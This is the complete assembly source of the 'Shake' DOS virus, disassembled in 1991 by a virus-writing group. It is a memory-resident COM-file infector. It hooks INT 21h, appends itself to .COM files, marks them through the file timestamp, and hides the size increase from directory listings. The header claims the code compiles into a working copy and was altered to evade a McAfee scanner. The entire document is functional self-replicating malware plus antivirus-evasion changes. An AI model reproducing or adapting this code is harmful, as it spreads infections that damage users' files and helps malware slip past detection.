;******************************************************************************
;                    The Shake Virus
;******************************************************************************
;
; Resident COM infector.
; Patch into INT 21.
; Randomly display, "Shake well before use!" upon file execute
; Adds 476 bytes to infected program
; Does not show file increase while resident (Stealth)
; Infects files upon getting free disk space (End of the directory)
;
; NOTE: This code will compile into a working copy of The Shake virus. Any
; ill attempt to modify this source code will result in a copy that does not 
; work.
;
; ANOTHER NOTE: This code has allready been changed in order to avoid detection
; by McAffe's SCAN v7.6C
;
;******************************************************************************
;                   Disassembled 4/30/91 by The High Evolutionary
;                     The RABID International Development Corp.
;******************************************************************************

int_21_vec  equ 84h         ; Vector to INT 21 (21*4)
mem_loc     equ 90h         ; Our memory location (I think)
code_seg    equ 92h         ; Segment of code to save from
                        ; CS
code_loc    equ 0           ; Code location for infection
our_code    equ 0B2h            ; Where the text resides for
                        ; INT 21, AH 09h
  
seg_a       segment byte public
        assume  cs:seg_a, ds:seg_a
  
        org 100h
  
shake       proc    far
  
start:
        db  0E8h, 01h, 00h      ;CALL 104...
        and [bp+50h],bx
        call    virus_start     
  
shake       endp

virus_start proc    near
        pop si
;
; Set up a marker that denotes that we are resident allready...
;
        mov ax,4203h        ; Move file pointer
        int 21h     
        cmp ax,1234h        ; 1234 will be the marker
        jne allocate_memory     ; Jump if not equal
        jmp short continue      ;
        db  90h         ; NOP
allocate_memory:
        mov ah,4Ah          ; 
        mov bx,0FFFFh       ; Request FFFF blocks
        int 21h 
        sub bx,500h         ; Subtract 500 from total 
                        ; available blocks
        mov ah,4Ah          ; Try it again
        int 21h     
        mov ah,48h          ; Allocate memory block
        mov bx,1Eh          ; Allocate 1Eh memory para's
        int 21h     
        mov es,ax           ; Save initial segment in ES
        sub si,5            ; Sub 5 from SI (Why?)
        nop             
        xor di,di           ; DI=0
        mov cx,1DCh         ; 476 bytes (Virus length)
;
; Copy virus code to DI
;
        rep movsb           ; Rep when cx >0 Mov [si] to
                        ; es:[di]
        push    ax
        mov ax,3Ch          
        push    ax
        retf
        push    ds
        xor ax,ax           ; Zero register
        mov ds,ax
;
; Patch into old INT 21
;
        les bx,dword ptr ds:int_21_vec ; Get address of INT 21
                        ; vector and save it in BX
        mov word ptr cs:[1B7h],bx   ; Point it to our memory loc.
        mov word ptr cs:[1B9h],es   ;...and get the segment
        mov word ptr ds:int_21_vec,7Ch
        mov word ptr ds:int_21_vec+2,cs
        pop ds
continue:
        call    save_bx         
virus_start endp
  
save_bx     proc    near
        pop si
        sub si,5Dh
        nop             
        mov ax,word ptr cs:[1B4h][si]
        mov word ptr ds:[100h],ax
        mov ah,byte ptr cs:[1B6h][si]
        mov byte ptr ds:[102h],ah
        push    ds
        pop es
        pop ax
        push    ds
        mov bx,100h
        push    bx
        retf
save_bx     endp
  
        cmp ah,11h          ; Are we searching for the
                        ; first FCB entry?
        je  first_FCB       ; Jump if equal
        cmp ah,12h          ; Are we searching for the
                        ; next FCB entry?
        jne next_FCB        ; Jump if not equal
first_FCB:
        pushf               ; Push flags
        call    dword ptr cs:[1B7h] ; Call old INT 21
        push    ax
        push    bx
        push    es
        mov ah,2Fh          ; Get DTA address
        int 21h 
        cmp byte ptr es:[bx],0FFh   
        jne new_DTA         ; Jump if not equal
        add bx,7
new_DTA:
        mov ax,es:[bx+17h]
        and ax,1Fh          ; Get the seconds stamp from
                        ; the COM file
        cmp ax,1Eh          ; Is it infected?
        jne return_flags        ; Jump if not equal
;
; We sub 476 bytes from the DTA so that infected files will look normal.
; Stealth???
;
        sub word ptr es:[bx+1Dh],1DCh ; 476 bytes
return_flags:
        pop es
        pop bx
        pop ax
        iret                ; Interrupt return
next_FCB:
        cmp ah,4Bh          ; Are we executing a file?
        jne not_exec        ; No? Continue...
        push    ax
        push    dx
        mov ah,2Ch          ; Get system time
        int 21h 
;
; Randomizer routine to see if we print out the message
;
        and dl,0Fh          ; AND 100th seconds by 0Fh
        or  dl,dl           ; Zero ?
        jnz no_message      ; Not zero? Then don't print
                        ; the message
        push    cs
        pop ds
        mov word ptr ds:our_code,25EBh ; Load DS with the location
                        ; of our code in order to
                        ; correctly print out the
                        ; message
        mov ah,9            ; Print message
        mov dx,offset ds:[1BDh]     ; Offset of string location
        int 21h     
        add sp,4
        iret                ; Interrupt return
no_message:
        pop dx
        pop ax
not_exec:
;
; Check to see if we are resident allready...
;
        cmp ax,4203h        ; Are we moving the file 
                        ; pointer?
        jne no_ptr_move     ; Jump if not equal
        mov ax,1234h
        iret                ; Interrupt return
no_ptr_move:
        cmp ah,36h          ; Are we getting free
                        ; disk space?
        je  free_disk_space     ; Jump if equal
        jmp do_int_21       ; No? Call INT 21
free_disk_space:
        push    ax
        push    bx
        push    cx
        push    dx          ; Restore all of the regs.
        push    ds
        push    es
        push    cs
        pop ds
        mov ah,4Eh          ; Find first file
        mov dx,offset ds:[1D6h]
        xor cx,cx           ; Normal files...
        int 21h 
        jnc found_file      ; Jump if carry=0
        jmp return_to_int       
found_file:
        mov ah,2Fh          ; Get DTA address
        int 21h     
        mov ax,es:[bx+16h]
        and ax,1Fh
        cmp ax,1Eh          ; Is it infected?
        jne infect_file     ; Jump if not equal
        jmp find_next       
infect_file:
        push    word ptr es:[bx+16h]
        push    word ptr es:[bx+18h]
        xor ax,ax           ; Zero register
        mov ds,ax
        mov word ptr ds:mem_loc,1AEh
        mov ds:code_seg,cs
        mov ax,3D02h        ; Open file with Read/Write
                        ; access
        mov dx,bx
        add dx,1Eh
        push    es
        pop ds
        int 21h     
        mov word ptr cs:[1BBh],ax
        push    cs
        pop ds
        mov ah,3Fh          ; Read file
        mov cx,3            ; 3 bytes
        mov dx,offset ds:[1B4h] ; To buffer area...
        mov bx,word ptr ds:[1BBh]   ; File handle...
        int 21h 
;***
; Scan string started here
;***
        mov ax,4202h        ; Move file pointer to the
                        ; end of the file
        xor dx,dx           ; DX=0
        mov cx,dx
        int 21h     
        cmp ax,0F000h
        jae close_file  
        sub ax,3
;***
; Scan string ended here
;***
        mov word ptr ds:[1B2h],ax
        mov ah,40h          ; Write file/device
        mov cx,1DCh         ; 476 bytes
        push    cs
        pop ds
        mov dx,code_loc     ; Pointer to buffer area
        int 21h         ; DOS Services  ah=function 40h
                        ; write file cx=bytes, to ds:dx
        jc  close_file      ; Jump if we fucked up...
        mov ax,4200h        ; Move file pointer to start
                        ; of file
        xor dx,dx           ; DX=0
        mov cx,dx
        int 21h     
        mov ah,40h          ; Write file/device
        mov cx,3            ; 3 bytes
        mov dx,offset ds:[1B1h] ; Set for JMP
        int 21h     
        jc  close_file      ; Jump if carry Set
close_file:
        mov ax,5701h        ; Set file date/time
        pop dx
        pop cx
        and cx,0FFFEh
        nop             
        or  cx,1Eh          ; New seconds
        nop             
        int 21h     
;
; Note, we do not preserve the old filestamp
;
        mov ah,3Eh          ; Close file
        mov bx,word ptr cs:[1BBh]
        int 21h     
        jmp short return_to_int 
find_next:
        mov ah,4Fh          ; Find next file
        int 21h         
        jc  return_to_int       ; Jump if carry Set
        jmp found_file      
return_to_int:
        pop es
        pop ds
        pop dx
        pop cx
        pop bx
        pop ax
do_int_21:
        jmp dword ptr cs:[1B7h]
;
; The following instructions originally appeared as hex codes (DB)
;

        mov al,03           ;B0 03
        iret                ;CF
        db  0e8h,0d8h,062h      ;CALL 63DE
        mov ah,4ch          ;B4 4C
        int 60          ;CD 60
        adc al,6ah          ;14 6A
        add al,[di]         ;02 05  
        add [bx],al         ;00 07

        db  'Shake well before use !$'
        db  '*.com',0

seg_a       ends
        end start

 ���� Data Items ������������������������
  seg:off   type & options     label           comments
  -------   --------------     --------------  --------------
0000:0084   dd, equ             ; int_21_vec
0000:0090   dw, equ             ; mem_loc
0000:0092   dw, equ             ; code_seg
76DD:0000   db, equ             ; code_loc
76DD:00B2   dw, equ             ; our_code
seg_a:0100  dw                  ; data_7
seg_a:0102  db                  ; data_8
seg_a:01B1  db                  ; Jump Location
seg_a:01B2  dw                  ; File to infect
seg_a:01B4  dw                  ; Virus Segment
seg_a:01B6  db                  ; Virus Code Segment
seg_a:01B7  dw, r 2             ; Old Int 21 vector
seg_a:01BB  dw                  ; File Handle
seg_a:01BD  da, r 11                ; data_16
seg_a:01D6  db                  ; data_17
